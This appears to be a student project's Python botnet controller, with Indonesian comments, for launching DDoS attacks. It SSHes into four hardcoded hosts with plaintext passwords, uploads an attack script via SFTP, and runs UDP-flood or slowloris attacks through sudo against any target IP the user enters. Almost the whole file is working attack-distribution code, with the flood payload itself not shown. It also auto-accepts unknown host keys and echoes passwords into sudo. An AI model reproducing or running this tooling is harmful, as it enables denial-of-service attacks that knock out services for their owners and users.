import paramiko
import threading
import sys
import subprocess
import time
from termcolor import colored

title = colored('''

   ___  ___       ____  ___ _______________  _______ __
  / _ \/ _ \___  / __/ / _ /_  __/_  __/ _ |/ ___/ //_/
 / // / // / _ \_\ \  / __ |/ /   / / / __ / /__/ ,<   
/____/____/\___/___/ /_/ |_/_/   /_/ /_/ |_\___/_/|_|  
                                                       
             DDOS ATTACK IN PROGRESS
         Script DDos Attack PBL RKS-213
''', 'red', attrs=['bold'])

# Fungsi untuk menjalankan command terminal local
def subprocess_dos(command):
    return subprocess.run(command, shell=True)

# list host yang akan digunakan untuk DDOS
hosts = [
    {'ip': '192.168.1.11', 'port': 22, 'username': 'bumi', 'password': 'qwe'},
    {'ip': '192.168.1.12', 'port': 22, 'username': 'bumi', 'password': 'qwe'},
    {'ip': '192.168.1.13', 'port': 22, 'username': 'bumi', 'password': 'qwe'},
    {'ip': '192.168.1.14', 'port': 22, 'username': 'bumi', 'password': 'qwe'},
]

# Fungsi untuk menghubungkan ke host dan menjalankan perintah menggunakan ssh
def run_command_on_host(host, port, username, password, attack_type, target_ip):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(host, port=port, username=username, password=password)
    
    # membuka koneksi dan file pada direktori botnet
    sftp = ssh_client.open_sftp()

    # memasukkan file attack_script.py ke botnet
    try:
        print("\n...sedang mengirim program DDOS pada botnet...")
        sftp.put('attack_script.py', f'/home/{username}/Desktop/attack_script.py')
        sftp.close()
        print("\nFile telah terkirim")
        time.sleep(1)

        # Mengolah command untuk botnet
        prefix_command = f"export DISPLAY=:0.0; cd Desktop; echo '{password}' | sudo -S"
        command_add = f"{prefix_command} python3 attack_script.py {attack_type} {target_ip}"
        
        # assign com_add ke variable baru karena exec_command tidak menerima formatted string
        full_command = command_add
        
        # membuat chanel shell interaktif
        channel = ssh_client.invoke_shell()

        # mengeksekusi command untuk setiap botnet
        channel.send(full_command + "\n")

        print(title)
        # Mengambil nilai stop_attack dari variabel bersama
        stop_attack = input(f"\n\nHOST = ({host} : {username})\nApakah anda ingin menghentikan serangan? \n[Y/n]? ").lower()

        if stop_attack == "y":
            cmd_stop = f"echo '{password}' | sudo -S killall python3"
            full_command_stop = cmd_stop

            channel.send(full_command_stop + "\n")    

            # menutup sesi shell
            channel.close() 
            # menutup sesi ssh
            ssh_client.close()

        elif stop_attack == "n": 
            print("\nserangan akan tetap dilanjutkan...")
        else:
            print("\ninvalid Input!!!")

    except Exception as e:
        print(f"Error Pada SSH: \nError : {e}")
        # Program akan berhenti jika terjadi error 
        sys.exit()

# Fungsi untuk menjalankan attack secara paralel di beberapa host
def start_ddos_attack(attack_type, target_ip, num_botnets):
    threads = []
    for i in range(min(num_botnets, len(hosts))):
        host = hosts[i]
        t = threading.Thread(target=run_command_on_host, args=(host['ip'], host['port'], host['username'], host['password'], attack_type, target_ip))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    print(title)
    attack_type = input("Masukkan jenis serangan (1.udpflood/2.slowloris): ").strip().lower()
    attack_type = 'udpflood' if attack_type == '1' else 'slowloris' if attack_type == '2' else None
    if not attack_type:
        print("Jenis serangan tidak valid.")
        sys.exit()
    
    target_ip = input("Masukkan IP target: ").strip()
    try:
        num_botnets = int(input("Masukkan jumlah botnet yang ingin digunakan(4): ").strip())
        if num_botnets <= 0:
            raise ValueError
    except ValueError:
        print("Jumlah botnet tidak valid.")
        sys.exit()
    
    start_ddos_attack(attack_type, target_ip, num_botnets)
